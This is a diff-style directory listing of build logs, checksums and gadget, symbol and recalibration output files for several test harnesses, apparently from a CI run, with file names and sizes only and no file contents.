+-rw-r--r-- 1 runner runner    348 Oct 28 05:05 h_g123_w155_recal.log
+-rw-r--r-- 1 runner runner    422 Oct 28 05:05 h_g123_w155_symbols.txt
+-rw-r--r-- 1 runner runner 188734 Oct 28 05:05 harness-desmos-g120_gadgets.json
+-rw-r--r-- 1 runner runner    161 Oct 28 05:05 harness-desmos-g120_gadgets.summary.txt
+-rw-r--r-- 1 runner runner    869 Oct 28 05:05 harness-desmos-g120_recal.json
+-rw-r--r-- 1 runner runner    388 Oct 28 05:05 harness-desmos-g120_recal.log
+-rw-r--r-- 1 runner runner    413 Oct 28 05:05 harness-desmos-g120_symbols.txt
+-rw-r--r-- 1 runner runner 194077 Oct 28 05:05 harness-desmos_gadgets.json
+-rw-r--r-- 1 runner runner    162 Oct 28 05:05 harness-desmos_gadgets.summary.txt
+-rw-r--r-- 1 runner runner    566 Oct 28 05:05 harness-desmos_recal.json
+-rw-r--r-- 1 runner runner    154 Oct 28 05:05 harness-desmos_recal.log
+-rw-r--r-- 1 runner runner    413 Oct 28 05:05 harness-desmos_symbols.txt
+-rw-r--r-- 1 runner runner     56 Oct 28 05:07 harness_control_build.log
+-rw-r--r-- 1 runner runner 221242 Oct 28 05:08 harness_control_gadgets.json
+-rw-r--r-- 1 runner runner    163 Oct 28 05:08 harness_control_gadgets.summary.txt
+-rw-r--r-- 1 runner runner    719 Oct 28 05:08 harness_control_recal.json
+-rw-r--r-- 1 runner runner    266 Oct 28 05:08 harness_control_recal.log
+-rw-r--r-- 1 runner runner    428 Oct 28 05:08 harness_control_symbols.txt
+-rw-r--r-- 1 runner runner    362 Oct 28 05:04 harness_desmos.file
+-rw-r--r-- 1 runner runner    100 Oct 28 05:04 harness_desmos.sha256
+-rw-r--r-- 1 runner runner     96 Oct 28 05:04 harness_desmos_bankcheck.txt
+-rw-r--r-- 1 runner runner      0 Oct 28 05:03 harness_desmos_build.log
+-rw-r--r-- 1 runner runner      0 Oct 28 05:04 harness_desmos_g120_build.log
+-rw-r--r-- 1 runner runner   9121 Oct 28 05:03 harness_desmos_gomod.log
+-rw-r--r-- 1 runner runner   4160 Oct 28 05:07 harness_fixed_build.log
+-rw-r--r-- 1 runner runner    408 Oct 28 05:07 harness_fixed_runs.txt
+-rw-r--r-- 1 runner runner    211 Oct 28 05:04 harness_min_gomod.log
